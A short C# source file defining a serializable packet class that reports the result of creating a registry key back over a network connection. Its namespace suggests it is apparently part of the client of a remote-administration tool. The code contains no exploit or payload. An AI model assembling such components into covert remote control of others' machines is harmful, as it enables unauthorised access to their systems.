using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetCreateRegistryKeyResponse : IPacket
    {
        public string ParentPath { get; set; }
        public RegSeekerMatch Match { get; set; }

        public bool IsError { get; set; }
        public string ErrorMsg { get; set; }

        public GetCreateRegistryKeyResponse() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
